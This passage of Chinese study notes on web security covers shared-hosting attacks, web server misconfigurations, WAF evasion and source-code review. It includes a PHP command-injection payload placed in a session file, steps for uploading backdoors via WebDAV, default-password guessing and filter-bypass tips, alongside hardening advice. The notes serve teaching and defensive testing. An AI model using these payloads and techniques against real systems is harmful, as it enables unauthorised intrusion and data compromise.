示例：PHP 会将会话内容存在在某个以会话 id 命名的文件中 内容如下： 因此攻击者可以通过设置自己的昵称，实现在会话文件中注入恶意命令的目的；例如将昵称设置为: 1&lt;?php passthru(id);?&gt; 然后再利用应用程序已存在的文件包含漏洞，通过将参数设置为会话文件的路径，实现对该文件的调用 渗透测试步骤： 对于已知的应用程序漏洞，充分发挥想象力，思考如果利用漏洞和应用程序分层架构间的信任关系，扩大漏洞的影响范围；很多针对 Web 应用程序的成功攻击，都是从利用某个影响有限的漏洞出发，再利用信任关系，破坏应用程序的其余部分，最终实现严重的攻击； 如果能够在应用程序的某个组件中执行任意命令，并能够与其他主机建立网络连接，则应考虑向操作系统和网络层面中的基础架构发动直接攻击，扩大攻击范围； 保障分层架构的安全尽量减少信任关系每一层尽量实施自己的权限控制，防止未授权的操作，同时不信任其他组件；示例如下： 服务器层对特殊的资源和 URL 路径实施基于角色的访问控制； 数据库层为不同的用户提供不同的账户，根据角色设置不同的权限范围；这样可以减少 SQL 注入漏洞的影响范围； 应用程序组件只使用最低权限的操作系统账户执行，以降低命令注入和文件遍历漏洞的影响范围； 隔离不同组件如有可能，尽量将每个层隔离开来，避免其无意间彼此交互 一个层不得读取和写入其他层使用的文件；而是使用其他层提供的访问渠道进行数据访问； 对不同组件之间的网络访问进行过滤，仅允许需要实现功能的最少服务。例如数据库服务器仅开放数据库查询端口，其他端口不开放；避免攻击者利用内部网络对数据库的操作系统层进行攻击； 有了 Docker 容器技术后，貌似以上目标更好实现了一些； 局部深层防御对构成整个应用程序的各个单独组件内部，进行加强防御； 对每台主机的各个层面进行安全强化，打上漏洞补丁，以减少攻击者利用漏洞进行扩散的可能性，让攻击的影响范围仅局限于单台机器； 对保存在应用程序层的数据进行加密，例如用户使用的密码、用户的敏感信息（如信用卡号等）； 共享主机与云服务供应商很多中小型企业会将自己的应用程序托管在云服务供应商的共享主机上面，此时需要注意以下风险： 云服务商的某个用户可能是攻击者，通过攻击云主机，实现对共享主机中其他组织的应用程序的攻击； 云服务商的某个用户可能在共享主机上部署了某个易受攻击的应用程序，导致共享主机被攻陷； 虚拟主机多个 Web 应用程序可能部署在同一台虚拟主机上，然后通过域名进行区分，当请求到达虚拟主机后，Nginx 或 Apache 服务器程序根据请求中的 Host 消息头区分请求的是哪一个应用程序，然后根据预先的配置，将请求转发给虚拟主机相应的应用程序； 共享的应用程序服务某个应用程序背后，可能是由分层的多个供应商的不同组成集成而来的；例如某个被大量中小企业共同需求的功能；举个栗子，在信用卡支付行业，市面上可能会存在三个层级的软件供应商： 零售商：向中小企业销售软件，并根据企业的需求定制外层的功能和界面； 信用卡公司：根据零售商的需求，开发核心功能； ASP 公司：根据多家信用卡公司的共同需求，开发核心应用程序，提供主机和部署，进行更新和支持； 攻击共享环境针对访问机制的攻击为了支持客户的个性化需求，ASP 一般通过上传（例如 FTP 或 SCP）或修改配置文件的功能来满足客户的定制需求，通常还会开放数据库端口，供客户查询保存的数据； 由于 ASP 供应商不可避免需要提供某种远程访问机制，因此存在一定的风险： 有些远程访问机制如 FTP 未加密，使得攻击者有机会在中间进行拦截，获取用户的密码； 部分远程访问软件本身存在漏洞或者配置缺陷，攻击者利用漏洞可绕过访问控制机制，访问或破坏客户的应用程序和数据； 远程访问的隔离机制可能做得不好，例如客户之间的数据没有完全隔离，存在相互访问的可能性；或者原本只需要提供文件访问的场景，却提供了 shell，允许客户输入各种命令； 数据库的隔离可能不完善； 数据库的连接可能使用非加密的方式访问； 有时 ASP 为客户提供单独的访问程序，来实现对核心程序的访问；这些单独的访问程序本身可能也存在漏洞，攻击者一旦攻陷，就可以对所有客户的应用程序发起攻击； 应用程序间的攻击在共享主机环境中，通常会允许用户向服务器合法上传可执行的脚本，导致存在应用程序间攻击的漏洞 预留后门攻击者伪装成某个应用程序的客户（即恶意客户），然后通过合法机制，上传恶意脚本，执行对服务器或其他用户应用程序的攻击； 有些共享应用程序甚至允许客户编写部分自己的代码，这也为恶意客户提供了引入恶意代码的机会； 应用程序本身漏洞如果应用程序本身存在漏洞，则攻击者可以利用该漏洞实现攻击： 利用 SQL 注入漏洞，对数据库进行查询，如果没有隔离机制，则攻击者可以读取并修改所有应用程序的数据； 利用路径遍历漏洞，读取和写入任意文件； 利用命令注入漏洞，控制服务器和其他应用程序； 应用程序组件漏洞由于共享应用程序允许客户做一定程度的定制，这意味着客户的定制代码可能会引入一些漏洞，攻击者可以利用这些漏洞进行攻击； 通常来说，共享应用程序存在多个组件，并且它们之间需要交互，常见漏洞如下： 不同客户的应用程序生成的数据通常会放在某个共享的文件目录下，然后 ASP 管理员有权限进行查看；这意味着为 XSS 攻击提供了方便之门，以自己的数据中注入脚本，当 ASP 管理员查看时，触发脚本的执行，获取管理权限或者管理功能； ASP 通常使用一个共享数据库保存所有的客户数据，因此一般使用某个共享组件，执行数据库的存储和查询过程，因此组件之间存在信任关系漏洞，恶意客户可以利用该信任关系获取其他用户的数据； 渗透测试步骤： 罗列共享应用程序为客户提供的访问机制 访问机制是否使用安全协议，及安全的基础架构？ 客户能否访问其原本不能访问的文件、数据或其他任意资源？ 访问机制是否为客户提供 shell，接受客户的任意指令？ 是否为客户提供某种定制或配置共享环境的功能？该功能是否可以成为攻击目标？ 如果应用程序支持命令、SQL 指令或任意文件，则值得仔细研究，寻找扩大攻击范围的可能性； 查找应用程序是否使用多个组件，如日志、管理、数据库等，检查这些组件是否存在漏洞； 检查应用程序所使用的数据库，使用开源工具如 NGSSquirrel 进行扫描，检查是否存在某些可利用的漏洞和缺陷；如有的话，再利用该漏洞扩大攻击范围； 攻击云越来越多的企业选择托管服务，这也意味着风险转移并聚集在了云服务商的身上，有部分安全问题已经是企业用户本身无法控制的；如果云服务商的托管服务出现漏洞，受影响的范围不再是某个应用程序或者某家企业，而是运行在托管环境中的成千上万的企业。 系统拷贝许多应用程序会依赖操作系统来生成随机数字，云服务商通常使用某个公共的镜像来安装操作系统，因此如果攻击者获得镜像的拷贝，则可以获得用于生成随机数字的源，从而能够预测随机数字生成器的状态和生成的值； 自助访问云服务商通常会提供某个管理云资源的自助页面，用户通过网页登录自助管理页面；如果登录过程存在访问控制漏洞，则攻击者有机会控制用户的云资源； 永久访问令牌用户需要管理云资源，为了避免频繁输入密码，用户一般会在本地保存某个令牌，用于登录验证；如果攻击者能够获取该令牌，则就能访问用户的云资源； Web 存储扩展云服务端提供的云存储功能是一个卖点，但它也意味着用户需要能够通过网页访问其存储的数据，因此云服务商在展示数据时，需要让数据支持某种浏览器扩展，而这些扩展可能存在漏洞； 保障共享环境的安全共享环境由于天然存在卧底和猪队友两种情形，因此需要特别留意访问控制、访问隔离和信任关系等问题； 保障客户访问的安全 访问机制需要使用严格的身份确认机制（目测阿里云和腾讯云都使用了双层验证机制，即增加了预留手机号的短信验证）； 仅给用户分配使用某个功能的最低权限；如果仅限于访问其私有目录；如果共享数据库，则确保其账户无法访问其他用户的数据； 如果使用某个定制的应用程序提供访问，则除了满足最严格的安全要求外，还需要对其进行测试； 隔离客户功能由于存在恶意客户的可能性，因此需要隔离每个客户使用的功能，确保单个客户无法攻击其他客户，常见措施如下： 为每个客户单独建立一个操作系统账号，并且该账号仅允许读取和写入为该客户分配的目录； 仅允许使用最低权限的少数操作系统命令； 为每个客户分配单独的数据库实例，仅向客户分配最低权限的账号，只允许访问私有的数据； PHP 6 之前的版本使用安全模式来降低脚本权限，但是模式有漏洞，如果能够运行 php 命令，则可以尝试通过 phpinfo 命令获取版本信息；然后根据得到的信息，了解安全模式是否激活，以及上网搜索可利用的漏洞情况； 隔离共享应用程序中的组件共享应用程序，例如 ASP 服务提供商提供的程序，通常使用大量的共享组件和客户定制组件。组件之间应减少信任关系，例如共享组件不可信任由客户定制组件发出的数据，并应对其进行严格的安全测试； 应特别注意共享日志与管理功能； 小结如果共享环境的安全机制做得好的话，可以帮助应用程序的开发者提高安全性，但是它也不可避免引入了一些难以解决的新问题。因为整个共享环境的安全从某种程度来说依赖于某个薄弱应用程序的最短板。攻击者通过攻击某个存在漏洞的应用程序，或者直接部署一个恶意程序，然后利用它来攻击整个共享环境； 18. 攻击 Web 服务器绝大多数 Web 应用程序都基于某种技术栈进行开发，并运行于某个 Web 服务器程序的背后；这样做的好处是可以极大的提高开发效率，开发者只关注业务逻辑本身即可，同时将大量通用的功能交由技术栈中的组件进行处理；但这也意味着风险，因为如果这些技术栈本身存在漏洞的话，攻击者就可以利用漏洞向应用程序发起攻击； Web 服务器配置缺陷Web 服务器通常含有大量的默认配置项，但是这些默认配置项本身可能存在着风险，如果开发者没有对其进行修改和强化的话，攻击者就有可能利用这些漏洞； 默认密码许多 Web 服务器程序包含管理接口，以便开发者访问并对服务器进行管理，有些接口位于某个默认的路径，有些则是运行在 8080 或者 8443 端口，并且使用默认密码 更有趣的是，除了服务器程序外，还有大量的设备使用禁止修改其默认密码的接口，例如交换机、打印机、无线AP 等； 以下两个网址收集了各种使用默认密码的场景： www.cirt.net/passwords www.phenoelit-us.org/dpl/dpl.html 渗透测试步骤： 在解析应用程序的环节，留心应用程序所使用的 Web 服务器程序和相关技术，以确认是否包含可访问的管理接口； 对 Web 服务器进行端口扫描，探查指向目标应用程序的所有管理接口； 找到接口后，查阅相关文档，了解这些接口所使用的默认密码；使用 Metasploit 的内置数据库扫描服务器； 如果默认密码无效，则尝试猜测有效的密码； 如果能够访问管理接口，则解析所有可用的功能， 看是否可以加以利用，进一步攻破主机和应用程序； 默认内容由于 Web 服务器程序是开源的，那么这同时意味着该程序有着丰富的文档内容和教程，可被攻击者利用，例如： 方便开发者调试的功能； 用于演示某些常见任务的样本功能； 开发者忘了禁止公共访问的某些隐藏的强大功能； 文档 调试功能调试功能对攻击者非常有用，因为它会展示大量配置信息和应用程序的状态；例如调用 Apache 自带的 phpinfo 文件，就会返回 php 程序的相关信息，例如配置项、版本号、文件路径等； 样本功能许多服务器程序会提供一些样本脚本，来演示如何调用服务器的相关功能。由于是基于演示的目的，为了让读者容易理解，这些脚本一般会特意编写的比较简单，但这也意味着攻击者可以利用里面可能存在的安全漏洞； 示例1：Jetty 7.0.0 版本的 Dump Servlet 可以通过 /test/jsp/dump.jsp 的 URL 访问，攻击者可以在 URL 标签中注入脚本代码； 示例2：Tomcat 的 Session Example 脚本可用于修改会话变量，攻击者可以利用它来攻击用户的会话，查看会话中的敏感信息，并修改会话，让应用程序执行开发者预期外的行为； 隐藏功能许多服务器程序使用和应用程序本身相同的 HTTP 端口来进行部署，常常只要提供正确的密码，就可以访问这些功能；许多黑客的攻击方法简单粗暴，总结为三板斧： 扫描端口+默认密码 上传恶意文件 执行恶意文件，获得 shell 管理功能 JMXJBoss 自带的 JMX 控制台提供了大量关于构建和部署程序的功能，因此里面也隐藏了很多安全漏洞； 例如使用 DeploymentFileRepository 的 store 方法上传包含恶意代码的 WAR 文件；通过 Metasploit 等工具可以很方便高效的利用这类漏洞； 数据库网关 PL/SQLOracle 服务器程序提供的 PL/SQL 网关产品，功能很强大，它提供了向数据库发送请求的接口，可以根据开发者提供的请求参数，转化成 SQL 请求发给数据库，简化开发者的工作；但是这也意味着攻击者可以利用它来实施数据库查询；虽然 Oracle 使用了白名单来作为补丁，但是仍然难以攻击者借道白名单之外的其他强大功能来实现攻击； 渗透测试步骤： 可以使用 Nikto 等工具来确定应用程序自带的默认内容； 利用搜索引擎确定应用程序使用的技术栈和相关的默认内容； 在本地安装这些技术，从中查找潜在的默认功能漏洞，并进行调试； 目录列表当请求的资源是某个目录的名称，而不是某个文件名称时，不同的应用程序可能会有不同的响应方式，常见的有3种： 返回 403，表示请求被禁止； 返回一个默认文件，例如 index； 返回目录中的文件列表（有些程序用它来做内容导航）； 返回文件列表有两个安全隐患： 一些敏感文件不小心在列表中被泄露，例如日志文件、备份文件、旧的脚本文件等； 开发者可能忘了对文件实施正确的访问控制，因为预期攻击者不知道这些文件的路径； 渗透测试步骤： 向 Web 服务器上的每一个目录发送请求； 从响应中找出会返回目录列表的路径； 攻击者还可以通过已经发现的漏洞，让服务器返回文件列表； HTTP 云存储由于云存储越来越普及，因此开发者需要提供一套基于 HTTP 协议的方法，让用户对分页式存储的文件进行访问和操作，WebDAV 就是一种常见的解决方案； 除了 GET 和 POST 外，WebDAV 通常还支持以下方法：PUT 上传文件、DELETE 删除文件、COPY 复制文件、MOVE 移动文件、SEARCH 搜索文件、PROPFIND 获取文件头信息； 可以使用 OPTIONS 方法获取某个特定目录支持的所有 HTTP 方法； 其中最危险的是 PUT 方法，因为它意味着攻击者可以上传恶意脚本；通常应用程序会对目录访问实施一定的权限控制，因此需要在测试过程中进行递归检查，找到被开发者漏洞的目录； 除了权限控制外，WebDAV 一般会基于某些脚本文件后缀名来限制用户上传的文件类型，从而避免引入恶意代码；但是 HTML 和 JAR 文件一般被允许，这意味着攻击者利用这两种类型的文件即可实现攻击； 渗透测试步骤： 使用第三方工具，例如 Burp Repeater 发送请求； 使用 OPTIONS 方法列出服务器支持的 HTTP 方法；不可完全相信 OPTIONS 请求的结果，因为实际上支持的方法取决于应用程序，而不是服务器程序；因此需要对所有可用和不可用的方法，都进行测试； 发现可用的方法后，先尝试上传良性文件，再尝试上传后门脚本； 如果发现脚本后缀被限制，则可以改成 txt 后上传；待上传成功后，再使用 MOVE 命令改成正确的后缀名； 如果以上方法都不行，则尝试上传 HTML 和 JAR 文件； 使用 davtest.pl 之类的工具自动遍历所有目录； 代理服务器如果 Web 服务器不直接对外提供服务，而是仅作为代理服务器，那么可能存在以下攻击面： 访问未在公网上暴露的内部网络； 转发恶意请求，隐藏攻击者的身份； 访问代理服务器上运行的其他服务，利用信任关系避开防火墙的限制； 如果 Web 服务器负责转发请求，当给它发一个完整 URL 的 GET 请求时，请求将会被转发到目标主机；但也有一些服务器没有转发，而是从自己的根目录中返回被请求的资源； 尝试使用 CONNECT 方法连接目标主机和端口号，如果服务器做出正确的响应，则说明它在代理到目标主机的连接；当连接建立以后，就可以尝试攻击非 HTTP 服务；但是，大多数服务器对可用端口做出严格的限制，一般只能访问 443 端口，无法访问其他端口；但是也说不定，有些开发者可能没有仔细配置，导致其他端口也暴露了； 渗透测试步骤： 使用 GET 和 CONNECT 请求，尝试用 Web 服务器作为代理服务器，连接因特网上的其他服务器，核对返回的响应内容； 当使用 CONNECT 建立连接后，尝试在请求中的 HOST 字段中指定不同的 IP 地址和端口号，扫描其本地可用服务；并在请求中指定 127.0.0.1 作为目标主机，连接 Web 服务器上的可用端口号； 虚拟主机配置缺陷当 Apache 代理多个站点时，一般配置文件的内容如下： 1234&lt;VirtualHost *&gt; ServerName eis DocumentRoot /var/www2&lt;/VirtualHost&gt; 这个配置文件的问题在于，它仅说明了特定 Web 站点的配置选项，却忘了 Web 服务器本身是有默认站点值的，该默认站点的值并未进行配置或修改，因此攻击者可以通过访问默认的虚拟站点进行攻击； 渗透测试步骤： 使用以下方式向根目录提交 GET 请求 正确的 Host 消息头； 随意的 Host 消息头； Host 消息头中的服务器 IP 地址； 无 Host 消息头； 进行以上请求的响应内容；一般来说，在 Host 消息头中指定 IP 地址可获得目录列表，以及各种默认的内容； 如果观察到不同的行为，使用造成异常行为的 Host 消息头重复解析过程，并使用 Nikto 等工具的 -vhost 选项进行扫描，尝试找到任何的默认内容； 保障 Web 服务器配置的安全疏忽大意和没有安全意识，是造成 Web 服务器漏洞的主要原因，因此在使用某个 Web 服务器软件之前，有必要对其文档进行深入的学习，以及相关的安全强化指南等教程； 常见配置问题如下： 修改任何默认的密码，删除任何不必要的账户； 对非标准端口设置防火墙，禁止公众访问； 对 Web 根目录所指向的路径实施访问控制； 删除与应用程序无关的不必要的默认内容和功能（可使用 Nikto 工具进行重复检查）； 如果部分默认功能需要保留，则应相应的进行安全强化，禁止不必要的选项和行为； 如果可能，关掉整个 Web 服务器的目录列表功能；确保每个可访问目录包含服务器默认提供的 index.html 文件； 除应用程序必须的方法外，禁用所有其他方法； 确保没有将 Web 服务器配置为代理服务器；如果一定要开启代理功能，则应只允许它连接特定主机和端口；并添加网络层的过滤，控制服务器向外发送的请求； 如果 Web 服务器支持虚拟主机，则应同时确保主机上完成了 Web 服务器需要的相关配置，以确保 Web 服务器的安全强化措施确实得以实现； 易受攻击的服务器软件由于攻守双方的博弈，随着时间推移，主流 Web 服务器平台变得日渐可靠，但由于 Web 服务器软件仍然在不断发展，因此新的漏洞仍然在不断产生，大多数新漏洞存在于以下软件中： IIS 和 Apache 的服务端扩展； 从头新开发的 Web 服务器（由于产品很新，之前较少受到黑客关注，因此容易隐藏未发现的漏洞）； 应用程序框架缺陷多年来，Web 应用程序框架一直存在着各式各样的缺陷，示例如下：.NET 填充提示漏洞 .NET 加密过程： 选择一段明文信息； 计算信息长度，得到应填充的字符数量； 填充相应的字符数到消息中 对填充后的明文信息分成相等大小的多个小组 将第一个小组与初始向量（某个初始值）进行 XOR 运算（初始向量或许也可以看做是第 0 个分组）； 对第一个小组的 XOR 运算结果进行 3DES 加密，得到第一个小组的加密值； 选择第二个小组，与上一个小组的加密值进行 XOR 运算； 对第二个小组的 XOR 运算结果进行 3DES 加密，得到第二个小组的加密值； 选择第三个小组，重复第 7 和第 8 两个步骤； 上面这个加密过程本身并没有什么漏洞，但好死不死的是曾经的 .NET 版本还有另外一个看似无害的信息泄露漏洞，即如果 .NET 在请求参数中发现加密填充错误，则应用程序会返回 HTTP 500 状态码。因此，攻击者可以利用这个信息泄露漏洞，逐位的进行试错，破解初始向量 IV；之后攻击者除了可以利用 IV 解密信息外，还可以利用它来加密信息，并利用框架对该加密值的信任关系，执行恶意指令； 教训：两个或者多个看似无害的漏洞，组合起来可能变得非常的有害； 内存管理漏洞考虑到性能，多数服务器程序是使用编译型语言编写的，这也意味着它们很可能存在缓冲区溢出漏洞； Apache mod_isapi 悬挂指针：2010 年版本的 Apache 在遇到错误时，系统将从内存中强制卸载 mod_isapi，但是函数指针仍然保留在内存中，这意味着攻击者可以调用该指针，访问其指向的内容； Microsoft IIS ISAPI 扩展：2001 年该漏洞使得攻击者可以在 Local System 权限下执行任意代码；2008 年该扩展被发现了另外一个漏洞； Apache 分块编码溢出：2002年，被发现存在整数符号错误造成的漏洞；2010年，被发现 mod_proxy 在处理 HTTP 响应的分块编码时，存在整数溢出； WebDAV 溢出； 编码与规范化漏洞一个请求到达服务器后，可能会被很多层的组件进行处理，例如服务器程序、应用程序业务逻辑、第三方库、操作系统等；这些组件可存在使用不同的编码处理方式，导致攻击者有机会利用这种差异避开过滤或者造成程序的异常行为； Apple iDisk Server 路径遍历漏洞：攻击者可以将路径遍历指令编码到请求参数中； Ruby WEBrick Web 服务器遍历漏洞：详见 http://www.securityfocus.com/bid/28123 Java Web 服务器目录遍历：JVM 不对 UTF-8 进行解码，因此攻击者通过 UTF-8 编码的 ../ 可实现路径编码，详见：https://tomcat.apache.org/security-6.html Allaire JRun 目录列表漏洞：JRun 会将 url 中以 jsp 结尾的请求，转发给负责 JSP 文件的组件处理，而该组件会对文件名进行 URL 解码，如果文件名是一个问号，则会当作查询关键字，查询目录内容并返回；详见 https://www.securityfocus.com/bid/3592 Jetty 也存在类似上例的漏洞，详见：https://www.kb.cert.org/vuls/id/402580 Microsoft IIS Unicode 路径遍历漏洞：攻击者通过提交 ../ 的各种非常 Unicode 编码形式来避开过滤；虽然 IIS 本身对路径遍历实施过滤，但是难以全面覆盖各种非法的形式； WebDAV 也存在类似上例的漏洞，攻击者通过在请求路径中插入 %c0%af，实现对受 ISS 保护文件的下载； 避开 Oracle PL/SQL 的过滤列表：虽然 Oracle 使用了过滤名单，但是攻击者通过将恶意指令进行编码，避开过滤清单的匹配，同时编码后的指令仍然可以由后端数据库进行解码并正确执行；这种漏洞普通存在，根本原因在于前端检查基于字符串匹配，但是后端却接受各种奇怪怪的编码形式，防不胜防，详见：http://www.securityfocus.com/archive/1/423819/100/0/threaded 查找 Web 服务器漏洞本章描述的各种漏洞由于时间悠久，因此这些版本的新版本可能都已经修复了以上漏洞，但重要的是背后的思路和本质。一般可以先从使用自动化扫描工具开始，对服务器程序进行测试，例如 Nessus； 另外还可以从以下站点查找最新的漏洞消息： Security Focus OSVDB Bugtraq 和 Full 邮件列表 当发现一些新漏洞后，再看一下 Exploit Database 和 Metasploit，看是否有人已经开始探查该漏洞； www.exploit-db.com www.metasploit.com www.grok.org.ukfull-disclosure http://osvdb.org/search/advsearch 如有可能，应该在本地安装目标软件进行测试，查找已知的广泛流传的漏洞，或者其他尚未发现的漏洞； 保障 Web 服务器软件的安全由于 Web 服务器软件通常是由第三方进行开发的，因此本质上来讲，客观存在一定程度的不可控因素。但是开发人员仍然可以采取一些有效的预防措施，降低风险的概率，包括如下： 选择记录良好的软件记录良好的标志包括： 存在严重漏洞的数量； 供应商是否及时修复这些漏洞并发布补丁； 应用供应商发布的补丁 有责任的供应商都会定期发布补丁，有时候问题是供应商内部自己发现的，有时候是由外部人员告知的。当补丁发布后，通过逆向工程很快就可以查找该补丁所要解决的问题所在，之后黑客便可以根据补丁所要修复的问题，对那些还未进行更新的应用程序发起攻击； 实施安全强化开发人员除了认真查看 Web 服务器软件中的强化指南外，还需要采取以下强化措施： 禁用一切不必要的功能。余下功能则应尽可能配置成严格执行的模式，可使用 IIS Lockdown 等工具来完成这个工作； 如有编译型语言编写的组件，则考虑是否改由解释型语言编写；如果不能，则应使用解释型语言的代码，对用户的输入进行检查过滤，确保安全后，再转发给编译型的组件； 对开启的功能进行重命名，这种模糊处理虽然不能从根本上解决问题，但可以防御一些自动化工具和一些新手； 实施最低权限原则，例如使用最低权限的操作系统账户，在 UNIX 环境中使用 chroot 环境以限制攻击的范围； 监控新的漏洞安排专职人员监控 Bugtraq 和 Full Disclosure 等网站，第一时间了解漏洞消息，并有效的进行改进； 使用多层防御实施多层的保护，以便万一 Web 服务器被攻破了，也能够最大程度的减少损失；常见措施包括： 限制 Web 服务器对其他应用程序组件的访问权限，例如只允许服务器账户使用数据库的 INSERT 功能，这样可以避免攻击者删除日志记录； 对进出 Web 服务器的流量实施严格的网络过滤； 使用入侵检测系统，以第一时间发现入侵行为；攻击者在攻破 Web 服务器后，一般会尝试建立反向连接，或者扫描DMZ 网络中的其他主机；入侵检测系统可以第一时间探查这些行为，并发出警报； Web 应用程序防火墙大多数应用程序都受到某种外部组件的保护，这些组件通常安装在相同主机上面，或者网络设备上面，提供入侵防御或入侵检测的功能。但实际上，它们能够发挥的效果非常的有限，但却给人们造成了更加安全的错觉，从而可能放松了警惕；这类组件的原理基本类似，它们都是基于特定的常见攻击荷载，而不是基于利用漏洞的常规方法 渗透测试步骤： 可以使用以下方法推断是否安装了 Web 应用程序防火墙 选择应用程序某个会在响应中返回所请求的参数值的 URL，提供一个随机的参数名，并在参数值中包含有效的攻击荷载；如果应用程序阻止了攻击请求，则说明很可能有外部防御组件； 如果某个请求参数值会在响应中返回，则修改该参数值，提交一系列模糊测试字符串，以及这些字符串的编码形式，观察响应结果，与原始请求参数进行比对，了解应用程序对请求参数的过滤检查机制； 针对参数的过滤检查机制，设计有效的攻击荷载，再次发起请求，确认是否存在入侵检测行为； 通过提交以下字符串，尝试避开应用程序的防火墙： 根据 IDP 入侵检测程序的工作原理，可以相应的设计出不会被其关键字库匹配到的字符串，作为攻击荷载，例如避免在 XSS 攻击中出现 &lt;script&gt; 字样或者 alert、xss 等字样； 如果特定的请求被阻止，则可以尝试在请求中的不同位置放入相同的参数，例如 GET 请求的 URL，POST 请求的消息体、POST 请求的 URL、cookie、页面隐藏参数等（详见第 4 章）； 找到接受非标准格式（如序列化和编码）参数的位置，提交攻击荷载； 将攻击荷载分布到多个参数中进行提交； 使用字符串串联功能来提交（例如 ASP.NET 的 HPP 功能）； 19. 查找源代码中的漏洞如果有机会源代码的话，那么只要掌握一些常用的技巧，即使不是专业的编程人员，也能够从源代码中发现很多潜在漏洞； 代码审查方法黑盒测试与白盒测试黑盒和白盒各有其优缺点，由于黑盒可以使用自动化的攻击工具，因此在大多数情况下，其发现漏洞的效率比较高，毕竟阅读源代码本身需要花费很多时间。但有少数漏洞则是阅读源代码就能直接发现漏洞，黑盒反而需要很长时间，例如一个通用的后门密码会明文的写在源代码中，但是通过黑盒测试很难发现它； 最好的方式是二者相互补充，在阅读源码的过程中，如果发现了潜在漏洞，就使用黑盒进行自动化的测试，看漏洞是否能够触发； 代码审查方法对于功能复杂的应用程序，源代码通常有成千上万行，从头到尾逐一阅读并不是最好的办法，可以使用结构化的技巧，来提高漏洞查找效率： 从数据进入点开始追踪整个处理的流程，审查负责处理这些数据的代码（不同的 Web 开发语言，其处理框架不同、常见配置不同，可事先阅读文档进行了解）； 在代码中搜索隐含常见漏洞的代码关键字，审查包含关键字的代码，确定是否存在漏洞； 对包含敏感功能的代码进行审查，理解其逻辑，审查是否存在安全问题。这些敏感功能包括：身份验证功能、会话管理、访问控制、输入确认、外部组件接口、动态库调用； 应用程序很可能对第三方库和 API 进行定制化的封装或扩展，在审查之前，可预先了解封装的内容； 常见漏洞特征漏洞的关键特征并不区分语言，虽然各种语言的语法不同，但是相同的漏洞，仍然在不同的语言中，呈现相同的特征 跨站点脚本在典型的 XSS 漏洞中，代码会从用户的请求参数中，提取参数值，生成 HTML 页面内容； 以及从请求参数中提取内容，作为响应中的变量值： 此处的漏洞微妙，即仅当 requestType的值为 3 的时候，漏洞才有可能被触发，这种漏洞在黑盒测试中不容易发现，除非使用对每一个参数都进行单独的测试； SQL 注入SQL 漏洞的典型特征是提取用户的输入，然后和各种硬编码的字符串组成 SQL 查询指令； 只需要在代码中搜索 SQL 指令的关键字片断，就很容易很到这一类硬编码的字符串； 注意：SQL 指令不区分大小写，因此搜索的时候，应该启用大小写不敏感的功能； 路径遍历调用操作系统 API 的位置，最有可能出现路径遍历漏洞， 此时代码常常将用户输入值附加在某个目录名称后面，组成完整的路径；此类漏洞常常出现于允许用户上传和下载文件的功能中； 任意重定向重定向漏洞的特征在于从用户提交的输入中提取内容用来组成 URL 值； 除了服务端外，客户端的 JS 代码也可能存在重定向漏洞，因此客户端 JS 代码也会提取用户的输入生成 URL；由于 JS 代码是明文的，任意用户都可以查看，因此攻击者无须权限，就可以核查里面的内容，是否包含可利用的漏洞； 在对参数值进行检查确认之后，再次解码就会引入漏洞，因为攻击者可以先将攻击荷载进行双重编码，第一次解码后，可通过检查；等到第二次解码时，再让攻击荷载真正生效起来；例如设计成这样： OS 命令注入 通常各种语言都有内置调用操作系统命令的方法，搜索这些方法的关键字即可，例如此处的 system； 后门密码为了调试方便，一般开发者会将后门密码写在身份验证的函数中，非常容易确认； 可执行文件漏洞应对可执行文件的源代码进行审查，确保里面没有包含一些常见的漏洞，例如： 缓冲区溢出漏洞当创建某个内存缓冲区后，接下来会调用 API 往缓冲区中写入数据，漏洞发生在写入的环节。有多个内置函数可以实现对缓冲区的写入，重点应该注意这些写入的内容，是否由用户控制，以及写入之前，是否对长度进行检查。通过在源代码中搜索每一个调用缓冲写入函数的位置，即可以排查漏洞； 常见的缓冲区写入函数有：strcpy、memcpy、sprintf 及它们的各种变体； 整数漏洞整数漏洞总体来说比较隐蔽，不仔细思考一眼不一定看得出来。但有些情况比较明显，例如有符号整数和无符号整数的比较时（原因：隐式转换）；例如 len 和 sizeof 的比较； 格式化字符串漏洞通过搜索 printf 和 FormatMessage 系列函数的位置，如果参数由用户控制，则很可能存在漏洞； 源代码注释当开发者觉得某段代码存在隐患，为避免遗忘，一般会在注释中写下说明，以便后续能够快速想起。但由于各种不可控的原因，这些隐患经常没有在第一时间得到排除，导致它们一直存在。通过在注释中搜索一些常见的关键字，可用来发现这类问题，常见关键字有：bug, problem, bad, hope, todo, fix, overflow, crash, inject, xss, trust, error 等； Java 平台获取用户提交的数据Java Web 程序一般通过 javax.servlet.ServletRequest 以及它的扩展 javax.servlet.http.HttpServletRequest 两个接口来获取用户提交的请求数据，这两个对象包含大量的方法，可用来提取请求对象中的内容； 会话交互Java Web 程序一般通过 javax.servlet.http.HttpSession 接口来管理用户的会话，该接口常用方法如下： 潜在的危险 API文件访问Java 一般使用 java.io.File 类来访问文件或目录，它的构造函数接收路径或者目录+文件名做为参数进行实例化，如果在构造函数中没有检查点和斜线，并且参数由用户控制，则可能存在路径遍历漏洞； 关于文件内容的读写，Java 常用类如下： 它们同样存在和 java.io.File 相同的问题 数据库访问以下几个用于查询数据库的 API 容易受到 SQL 注入攻击，因为它们的查询参数直接由拼接字符串的方式实现； 另外一种更加安全的做法，是避免拼接字符串，而是以替换指定位置的字符串来实现（通过 prepareStatement），包括如下： OS 命令执行Java 调用系统命令的 API 如下： 如果传递给这些 API 的参数能够被用户控制，则存在命令注入漏洞。但如果用户只能控制部分字符串，例如只能指定命令参数，而不能指定命令名称，那么出现漏洞的概率就比较小； 重定向Java 发送重定向响应的相关 API 如下： 攻击者除了通过 sendRedirect 来实现重定向外，还可以使用 setStatus 为 3XX，同时通过 addHeader 添加 Location 字段，来实现重定向； 套接字Java 使用 java.net.Socket 类来创建 socket 连接，如果用户能够控制传递给 socket 类的参数，则可能存在漏洞，因为攻击者可以利用该 socket 连接，访问其他主机； 配置 Java 环境Java web 环境配置参数一般放在 web.xml 文件中，内容一般包括登录验证方式，资源访问控制等； 除了 web.xml 文件外，还有部分相关配置参数放在应用程序服务器的配置文件中，例如 weblogic.xml 文件等，应同时检查这些配置文件，查看是否存在漏洞； ASP.NET获取用户提交的数据System.Web.HttpRequest 类 会话交互Session 类：保留跟当前会话相关的用户信息； Profile 类：用于保存用户的个性化设置，因此它是持久性的，跟当前会话无关； System.Web.SessionState.HttpSessionState 类：也可以用来保存会话信息，相关的方法如下： 潜在的危险 API文件访问System.IO.File 类： 读取和写入的类： 数据库访问 同 Java 一样，如果直接拼接查询字符串会存在漏洞隐患，更安全的做法是通过 